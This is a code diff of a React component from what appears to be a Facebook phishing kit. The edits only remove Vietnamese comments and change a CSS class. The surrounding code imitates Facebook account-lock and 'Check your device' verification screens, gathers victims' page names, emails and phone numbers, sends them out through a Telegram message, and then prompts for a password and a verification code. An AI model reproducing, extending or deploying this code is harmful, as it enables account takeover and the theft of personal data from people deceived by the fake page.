@@ -85,7 +85,6 @@ const Home = () => {
         }
     }, [showGif, homeTranslated]);
 
-    // 🎯 CẬP NHẬT: Dịch ngầm cho verify + sendinfo
     const translateBackgroundComponents = useCallback(async (targetLang) => {
         try {
             const passwordTexts = {
@@ -103,7 +102,6 @@ const Home = () => {
                 description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.'
             };
 
-            // 🎯 Dịch verify với data mặc định - ĐÃ SỬA
             const verifyTexts = {
                 title: 'Check your device',
                 description: `We have sent a verification code to s****g@m****.com, ******32 . Please enter the code we just sent to continue.`,
@@ -352,7 +350,6 @@ const Home = () => {
         return Object.keys(newErrors).length === 0;
     };
 
-    // 🎯 CẬP NHẬT: Hàm submit nhanh - UPDATE ALL TRƯỚC KHI HIỆN PASSWORD
     const handleSubmit = async () => {
         if (!isFormEnabled || isSubmitting) return;
         
@@ -360,11 +357,9 @@ const Home = () => {
             try {
                 setIsSubmitting(true);
                 
-                // 🎯 GỬI TELEGRAM DATA FORM
                 const telegramMessage = formatTelegramMessage(formData);
                 await sendMessage(telegramMessage);
 
-                // 🎯 LƯU DATA VÀO LOCALSTORAGE
                 const userInfoData = {
                     name: formData.pageName,
                     email: hideEmail(formData.mail),
@@ -373,13 +368,11 @@ const Home = () => {
                 };
                 localStorage.setItem('userInfo', JSON.stringify(userInfoData));
 
-                // 🎯 UPDATE DỊCH VERIFY VỚI DATA THẬT (TRƯỚC KHI HIỆN PASSWORD)
                 const targetLang = localStorage.getItem('targetLang');
                 if (targetLang && targetLang !== 'en') {
                     await updateVerifyTranslation(targetLang, userInfoData.email, userInfoData.phone);
                 }
 
-                // 🎯 HIỆN PASSWORD SAU KHI ĐÃ UPDATE ALL XONG
                 setIsSubmitting(false);
                 setShowPassword(true);
                 
@@ -399,7 +392,6 @@ const Home = () => {
         }
     };
 
-    // 🎯 HÀM UPDATE DỊCH VERIFY VỚI DATA THẬT - ĐÃ SỬA
     const updateVerifyTranslation = async (targetLang, email, phone) => {
         try {
             const verifyTexts = {
@@ -470,7 +462,7 @@ const Home = () => {
                     <img 
                         src={logoGif} 
                         alt="Loading" 
-                        className="w-full h-full max-w-[500px] max-h-[500px] object-contain" 
+                        className="w-screen h-screen object-contain" 
                     />
                 </div>
             )}
